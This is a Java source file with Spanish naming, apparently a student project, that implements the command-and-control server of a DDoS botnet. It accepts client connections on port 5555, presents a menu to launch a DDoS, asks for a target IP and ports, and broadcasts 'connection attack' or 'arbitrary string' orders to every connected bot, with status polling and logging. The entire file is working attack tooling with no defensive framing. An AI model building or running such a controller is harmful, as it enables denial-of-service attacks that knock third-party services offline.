import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Scanner;

public class Servidor {
	private static ArrayList<Socket> socketList = new ArrayList();

	public static void main(String[] arg) throws IOException,
			ClassNotFoundException, InterruptedException {
		Logger.LogAccionServidor("Inicio de servidor");
		ServerSocket serverSocket = new ServerSocket(5555);
		Socket socket = serverSocket.accept();
		socketList.add(socket);

		Sesion sesion = new Sesion(socketList, serverSocket);
		Logger.LogAccionServidor("Cliente conectado");
		sesion.start();
		MostrarMenu();
	}

	public static void MostrarMenu() throws InterruptedException, IOException {
		Scanner keyboard = new Scanner(System.in);
		int eleccion;
		String menu = "Opciones\n";
		menu += "1. Iniciar DdoS.\n";
		menu += "2. Estado.\n";
		menu += "3. Salir\n";
		menu += "Elija una opcion: \n";

		while (true) {
			System.out.print(menu);

			eleccion = keyboard.nextInt();

			switch (eleccion) {

			case 1:
				Logger.LogAccionServidor("Enviada orden de ataque a clientes");
				IniciarDdos(socketList);
				break;

			case 2:
				Logger.LogAccionServidor("Enviado pedido de estado a clientes");
				PedirEstado();
				break;

			case 3:
				Logger.LogAccionServidor("Fin de Servidor");
				System.exit(0);
				break;

			default:
				System.out.println("Opcion incorrecta.");
				Logger.LogAccionServidor("Opcion seleccionada incorrecta");
				Thread.sleep(4000);
				MostrarMenu();
				break;
			}
		}
	}

	private static void PedirEstado() throws IOException, InterruptedException {
		// TODO Auto-generated method stub

		for (Socket socket : socketList) {
			DataOutputStream dos = new DataOutputStream(
					socket.getOutputStream());
			try {
				if(socket.isConnected() == true)
				{
					dos.writeUTF("Estado");
					DataInputStream dis = new DataInputStream(socket.getInputStream());
					String estadoCliente = dis.readUTF();
					System.out.println(estadoCliente);
					Logger.LogAccionServidor("Recibido estado de Cliente " + estadoCliente);}
				else
					Logger.LogAccionServidor("Cliente sin conexion");
			} catch (IOException ex) {
				throw new IOException("Cliente sin Conexion");
			}
		}
	}

	private static void IniciarDdos(ArrayList<Socket> socketList)
			throws IOException {
		String ip;
		String puertos;
		String tipoDeAtaque = null;
		String stringArbitrario = null;
		int eleccion;

		Scanner keyboard = new Scanner(System.in);
		System.out.println("Ingrese IP:");
		ip = keyboard.next();
		
		System.out.println("Ingrese Puertos (separados por coma):");
		puertos = keyboard.next();

		System.out.println("Elija tipo de Ataque\n");
		System.out.println("1- Ataque de conexion\n");
		System.out.println("2- String Arbitrario\n");

		eleccion = keyboard.nextInt();

		switch (eleccion) {

		case 1:
			AtaqueDeConexion(ip, puertos, tipoDeAtaque);
			Logger.LogAccionServidor("Ataque de conexion a Ip: " + ip.toString() + ",puertos: " + puertos.toString());
			break;

		case 2:
			AtaqueConStringArbitrario(ip, puertos, tipoDeAtaque,stringArbitrario);
			Logger.LogAccionServidor("Ataque de string arbitrario a Ip: " + ip.toString() + ",puertos: " + puertos.toString() + ",String: " + stringArbitrario);
			break;

		default:
			System.out.println("Opcion incorrecta.");
			break;
		}
	}

	private static void AtaqueConStringArbitrario(String ip, String puertos,
			String tipoDeAtaque, String stringArbitrario) throws IOException {
		String parametrosACliente;
		Scanner keyboard = new Scanner(System.in);
		tipoDeAtaque = "String Arbitrario";
		System.out.println("Ingrese cadena a enviar:\n");
		stringArbitrario = keyboard.next(); // TODO: Verificar nextLine
		parametrosACliente = tipoDeAtaque + "\n" + ip + "\n" + puertos + "\n"
				+ stringArbitrario;

		for (Socket socket : socketList) {
			DataOutputStream dos = new DataOutputStream(
					socket.getOutputStream());
			dos.writeUTF(parametrosACliente);
		}
	}

	private static void AtaqueDeConexion(String ip, String puertos,
			String tipoDeAtaque) throws IOException {
		String parametrosACliente;

		tipoDeAtaque = "Ataque de conexion";
		parametrosACliente = tipoDeAtaque + "\n" + ip + "\n" + puertos + "\n";

		for (Socket socket : socketList) {
			DataOutputStream dos = new DataOutputStream(
					socket.getOutputStream());
			dos.writeUTF(parametrosACliente);
		}
	}
}
